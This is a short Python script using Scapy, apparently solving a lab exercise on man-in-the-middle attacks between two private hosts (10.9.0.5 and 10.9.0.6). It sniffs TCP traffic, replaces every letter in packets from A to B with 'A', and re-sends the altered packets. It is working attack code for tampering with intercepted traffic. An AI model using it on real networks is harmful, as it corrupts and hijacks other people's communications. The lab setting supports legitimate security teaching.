#!/usr/bin/python3

from scapy.all import *

IP_B = "10.9.0.6"
# B_MAC = "02:42:0a:09:00:06"
IP_A = "10.9.0.5"
# A_MAC = "02:42:0a:09:00:05"


def process_packet(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].payload:
        data = pkt[TCP].payload.load
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        datalist = list(data)
        for i in range(0, len(datalist)):
            if chr(datalist[i]).isalpha():
                datalist[i] = ord('A')
        newdata = bytes(datalist)
        send(newpkt/newdata)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = pkt[IP]
        send(newpkt)
sniff(iface='eth0', filter='tcp', prn=process_packet)